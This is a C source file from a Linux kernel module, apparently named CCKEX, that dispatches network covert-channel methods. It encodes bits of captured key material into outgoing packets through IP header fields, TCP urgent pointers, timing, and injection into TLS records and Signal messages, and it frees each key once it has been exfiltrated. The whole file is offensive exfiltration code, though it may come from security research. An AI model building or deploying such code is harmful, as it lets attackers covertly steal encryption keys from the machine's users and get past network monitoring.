#include "cchandler.h"

#include <linux/slab.h>
#include <linux/spinlock.h>
#include <net/ip.h>
#include <net/tcp.h>

#include "ccmethod.h"
#include "../common.h"
#include "../net/tls.h"

static struct cckex_key_list_entry* key_entry = NULL;

typedef struct cckex_cc_method_entry {
	struct list_head list;
	cckex_cc_method_t method;
	uint8_t enable_flag;
} cckex_cc_method_entry_t;

static DEFINE_SPINLOCK(cc_method_list_slock);

static LIST_HEAD(cc_method_list);

static int enable_http_header_cc_injection = 0;
static int enable_signal_message_cc_injection = 0;
static int enable_encryption_layer_injection = 1;

static cckex_cc_method_entry_t available_cc_methods[] = {
	{ .method = &cckex_cc_full_ttl  , .enable_flag = 0 },
	{ .method = &cckex_cc_iptos     , .enable_flag = 0 },
    { .method = &cckex_cc_ipflags   , .enable_flag = 0 },
    { .method = &cckex_cc_ipid      , .enable_flag = 0 },
    { .method = &cckex_cc_ipfragment, .enable_flag = 0 },
    { .method = &cckex_cc_tcpurgent , .enable_flag = 0 },
    { .method = &cckex_cc_timing_ber, .enable_flag = 0 }
};

static int add_cc_method(unsigned int method_index) {

	//pr_info("CCKEX_LKM [%s] enable method %i", __func__, method_index);

	if(method_index == CC_METHOD_MSG_INJ) {
		enable_signal_message_cc_injection = 1;
		return 0;
	}

	// cc method array bounds check
	if(method_index >= ARRAY_SIZE(available_cc_methods)) {
		pr_warn("CCKEX_LKM [add_cc_method]: method_index >= array_size (%i >= %lu)", method_index, ARRAY_SIZE(available_cc_methods));
		return -1;
	}

	// check if method is already enabled
	if(available_cc_methods[method_index].enable_flag) {
		//pr_info("CCKEX_LKM [add_cc_method]: cc method %i is already enabled", method_index);
		return 0;
	}

	spin_lock_bh(&cc_method_list_slock);

	list_add(&available_cc_methods[method_index].list, &cc_method_list);
	available_cc_methods[method_index].enable_flag = 1;

	spin_unlock_bh(&cc_method_list_slock);

	//pr_info("CCKEX_LKM [add_cc_method]: inserted new cc method: %i", method_index);

	return 0;
}

static int remove_cc_method(unsigned int method_index) {

	if(method_index == CC_METHOD_MSG_INJ) {
		enable_signal_message_cc_injection = 0;
		return 0;
	}

	// cc method array bounds check
	if(method_index >= ARRAY_SIZE(available_cc_methods)) {
		pr_warn("CCKEX_LKM [remove_cc_method]: method_index >= array_size (%i >= %lu)", method_index, ARRAY_SIZE(available_cc_methods));
		return -1;
	}

	// check if method is already disabled
	if(!available_cc_methods[method_index].enable_flag) {
		//pr_info("CCKEX_LKM [remove_cc_method]: cc method %i is already disabled", method_index);
		return 0;
	}

	spin_lock_bh(&cc_method_list_slock);

	list_del(&available_cc_methods[method_index].list);
	available_cc_methods[method_index].enable_flag = 0;

	spin_unlock_bh(&cc_method_list_slock);

	//pr_info("CCKEX_LKM [remove_cc_method]: removed cc method: %i", method_index);

	return 0;
}

long cckex_change_cc(const cckex_ioctl_cc_mode_t *cc_mode) {

	switch(cc_mode->action) {
		case CCKEX_CC_MODE_ACTION_ADD:
				add_cc_method(cc_mode->method_index);
			break;
		case CCKEX_CC_MODE_ACTION_REMOVE:
				remove_cc_method(cc_mode->method_index);
			break;
		default:
			pr_warn("CCKEX_LKM [cckex_change_cc]: invalid action %i", cc_mode->action); 
			break;
	}

	return 0;
}

int cckex_signal_message_injection_active(void) {
	return enable_signal_message_cc_injection;
}

int cckex_http_header_injection_active(void) {
	return enable_http_header_cc_injection;
}

int cckex_apply_cc(struct sk_buff *skb) {
	cckex_cc_method_entry_t *iter;

	if(enable_encryption_layer_injection) {
		if(cckex_filter_tls_hello_message_v4(skb, NF_INET_POST_ROUTING) == CCKEX_MSG_TYPE_TLS_RECORD) {
			//pr_info("CCKEX_LKM [%s] trying to inject into tls message", __func__);
			cckex_cc_inject_into_message(skb);
			cckex_update_checksums(skb);
		}
	} else {
		cckex_move_in_keylist_to_out_cc_keylist();
	}

	//pr_info("CCKEX_LKM [%s] pre localhost filtering", __func__);

	if(cckex_skb_v4_dest_is_localhost(skb)) return -1;

	spin_lock_bh(&cc_method_list_slock);

	list_for_each_entry(iter, &cc_method_list, list) {

		// fetch new key entry from key list if current entry was exfiltrated
		if(!key_entry) key_entry = cckex_try_fetch_cc_key_entry();

		//pr_info("CCKEX_LKM [%s] found active cc: %i", __func__, iter->method);

		if(key_entry && key_entry->size) {

			iter->method(skb, key_entry);

			if(!cckex_keybuf_has_bits(key_entry)) {
				kfree(key_entry->buf);
				kfree(key_entry);
				key_entry = NULL;
			}
		}

        // recalculate checksumms
		cckex_update_checksums(skb);
	}

	spin_unlock_bh(&cc_method_list_slock);

	return 0;
}
